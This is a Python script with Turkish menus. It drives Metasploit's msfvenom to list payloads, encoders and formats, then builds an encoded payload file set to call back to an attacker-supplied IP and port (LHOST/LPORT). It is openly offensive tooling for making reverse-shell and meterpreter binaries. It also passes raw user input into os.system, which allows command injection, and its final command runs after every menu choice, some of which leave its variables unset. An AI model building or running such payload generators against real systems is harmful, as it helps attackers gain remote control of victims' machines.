from colorama import Fore, Back, Style
import time
import os
def aix_listele():
    print("Aix Listeleniyor...")
    print("\n")
    os.system("msfvenom -l payloads | grep aix")
    print("\n")

def androdi_listele():
    print("Android Listeleniyor...")
    print("\n")
    os.system("msfvenom -l payloads | grep android")
    print("\n")

def apple_listele():
    print("Apple_ios Listeleniyor...")
    print("\n")
    os.system("msfvenom -l payloads | grep apple")
    print("\n")

def bsd_listele():
    print("Bsd Listeleniyor...")
    print("\n")
    os.system("msfvenom -l payloads | grep bsd")
    print("\n")

def cmd_listele():
    print("Cmd Listeleniyor...")
    print("\n")
    os.system("msfvenom -l payloads | grep cmd")
    print("\n")

def firefox_listele():
    print("Firefox Listeleniyor...")
    print("\n")
    os.system("msfvenom -l payloads | grep firefox")
    print("\n")

def generic_listele():
    print("Generic Listeleniyor...")
    print("\n")
    os.system("msfvenom -l payloads | grep generic")
    print("\n")

def java_listele():
    print("Java Listeleniyor...")
    print("\n")
    os.system("msfvenom -l payloads | grep java")
    print("\n")

def linux_lsitele():
    print("Linux Listeleniyor...")
    print("\n")
    os.system("msfvenom -l payloads | grep linux")
    print("\n")

def meterpreter_listele():
    print("Meterpreter Listeleniyor...")
    print("\n")
    os.system("msfvenom -l payloads | grep mutli/meterpreter")
    print("\n")

def mainframe_listele():
    print("Mainframe Listeleniyor...")
    print("\n")
    os.system("msfvenom -l payloads | grep mainframe")
    print("\n")

def nodejs_listele():
    print("Nodejs Listeleniyor...")
    print("\n")
    os.system("msfvenom -l payloads | grep nodejs")
    print("\n")

def osx_listele():
    print("OSx Listeleniyor...")
    print("\n")
    os.system("msfvenom -l payloads | grep osx")
    print("\n")

def php_lsitele():
    print("Php Listeleniyor...")
    print("\n")
    os.system("msfvenom -l payloads | grep php")
    print("\n")

def python_listele():
    print("Python Listeleniyor...")
    print("\n")
    os.system("msfvenom -l payloads | grep python")
    print("\n")

def ruby_listele():
    print("Ruby Listeleniyor...")
    print("\n")
    os.system("msfvenom -l payloads | grep ruby")
    print("\n")

def solaris_listele():
    print("Solaris Listeleniyor...")
    print("\n")
    os.system("msfvenom -l payloads | grep solaris")
    print("\n")

def tty_listele():
    print("Tty Listeleniyor...")
    print("\n")
    os.system("msfvenom -l payloads | grep tty")
    print("\n")

def windows_listele():
    print("Windows Listeleniyor...")
    print("\n")
    os.system("msfvenom -l payloads | grep windows")
    print("\n")

def payload_list():
    while True:
        print("""Payload türleri:\n
        1) Aix
        2) Android
        3) Apple_ios
        4) Bsd
        5) Cmd
        6) Firefox
        7) Generic
        8) Java 
        9) Linux
       10) Multi/Meterpreter
       11) Mainframe
       12) Nodejs
       13) Osx
       14) Php
       15) Python
       16) Ruby
       17) Solaris
       18) Tty
       19) Windows
       20) Önceki adım\n""")
        payload_list_secim = input(str("Listelemek istediğiniz payload türü(Önceki adım için '20' ya da 'g' basınız): "))
        print("\n")
        if payload_list_secim == '1':
            aix_listele()
        elif payload_list_secim == '2':
            androdi_listele()
        elif payload_list_secim == '3':
            apple_listele()
        elif payload_list_secim == '4':
            bsd_listele()
        elif payload_list_secim == '5':
            cmd_listele()
        elif payload_list_secim == '6':
            firefox_listele()
        elif payload_list_secim == '7':
            generic_listele()
        elif payload_list_secim == '8':
            java_listele()
        elif payload_list_secim == '9':
            linux_lsitele()
        elif payload_list_secim == '10':
            meterpreter_listele()
        elif payload_list_secim == '11':
            mainframe_listele()
        elif payload_list_secim == '12':
            nodejs_listele()
        elif payload_list_secim == '13':
            osx_listele()
        elif payload_list_secim == '14':
            php_lsitele()
        elif payload_list_secim == '15':
            python_listele()
        elif payload_list_secim == '16':
            ruby_listele()
        elif payload_list_secim == '17':
            solaris_listele()
        elif payload_list_secim == '18':
            tty_listele()
        elif payload_list_secim == '19':
            windows_listele()
        elif payload_list_secim == 'g' or payload_list_secim == '20':
            time.sleep(0.2)
            break;
        else:
            print(">>>>>Geçersiz girdi!!!")
            print("\n")
            time.sleep(0.5)

def encoders_listele():
    print("Encoder'lar Listeleniyor...")
    print("\n")
    os.system("msfvenom -l encoders")
    print("\n")

def nops_listele():
    print("Nop'lar Listeleniyor...")
    print("\n")
    os.system("msfvenom -l nops")
    print("\n")

def platform_lsitele():
    print("Platform'lar Listeleniyor...")
    print("\n")
    os.system("msfvenom -l platforms")
    print("\n")

def arch_listele():
    print("Arch'lar Listeleniyor...")
    print("\n")
    os.system("msfvenom -l archs")
    print("\n")

def encrypt_listele():
    print("Encrypt'lar Listeleniyor...")
    print("\n")
    os.system("msfvenom -l encrypts")
    print("\n")

def format_listele():
    print("Format'lar Listeleniyor...")
    print("\n")
    os.system("msfvenom -l formats")
    print("\n")

def make_payload():
    while True:
        print("""
        1) Payload'ları listeleyip görmek
        2) Payload kullanmak(seçmek)
        3) Önce adım\n""")
        secim = input(str("Seçiminiz: "))
        print("\n")

        if secim == '1':
            payload_list()
        elif secim == "2":
            paylaod = input(str("Kullanmak istediğiniz paylaod (payload'ın tamamını yazın): "))
            print("\n")
            encoders_listele()
            encoder = input(str("Kullanmak istediğiniz encoder (encoder'ın tamamını yazın): "))
            print("\n")
            iterasyon = input(str("Kaç defa encode edilsin: "))
            print("\n")
            platform_lsitele()
            platform = input(str("Kullanmak istediğiniz platform (platformu tam adı ile yazın): "))
            print("\n")
            arch_listele()
            arch = input(str("Kullanmak istediğiniz arch (arch'ın tamamını yazın): "))
            print("\n")
            LHOST = input(str("Kullanmak istediğiniz local ip (saldırgan ip): "))
            print("\n")
            LPORT = input(str("Kullanmak istediğiniz port: "))
            print("\n")
            format_listele()
            format = input(str("Kullanmak istediğiniz formak (format'ın tamamını yazın): "))
            print("\n")
            path = input(str("Kaydedileceği yeri ve ismini yazınız(Örnek: /home/user/deneme.exe): "))
        elif secim == '3' or secim == 'g':
            time.sleep(0.2)
            break;
        else:
            print(">>>>>Geçersiz girdi!!!")
            print("\n")
            time.sleep(0.5)



        os.system("msfvenom -p "+paylaod+" -e "+encoder+" -i "+iterasyon+" --platform "+platform+" -a "+arch+" LHOST="+LHOST+" LPORT="+LPORT+" -f "+format+" > "+path)

def msfvenom():
    while True:
        print(Fore.GREEN)
        os.system("figlet MSFVENOM")
        print(Fore.RESET)
        print("""
        1) Payloadları listele
        2) Encoder'ları listele
        3) Nop'ları listele
        4) Platformları listele
        5) Arch'ları listele
        6) Encrypt'ları listele
        7) Formatları listele
        8) Payload hazırla
        9) Önceki adım\n""")

        msfvenom_secim = input(str("Seçmek istediğiniz adım(Önceki adım için '4' ya da 'g' basınız): "))
        if msfvenom_secim == '1':
            payload_list()
        elif msfvenom_secim == '2':
            encoders_listele()
        elif msfvenom_secim == '3':
            nops_listele()
        elif msfvenom_secim == '4':
            platform_lsitele()
        elif msfvenom_secim == '5':
            arch_listele()
        elif msfvenom_secim == '6':
            encrypt_listele()
        elif msfvenom_secim == '7':
            format_listele()
        elif msfvenom_secim == '8':
            make_payload()
        elif msfvenom_secim == '9' or msfvenom_secim == 'g':
            time.sleep(0.2)
            break;
        else:
            print(">>>>>Geçersiz girdi!!!")
            print("\n")
            time.sleep(0.5)
msfvenom()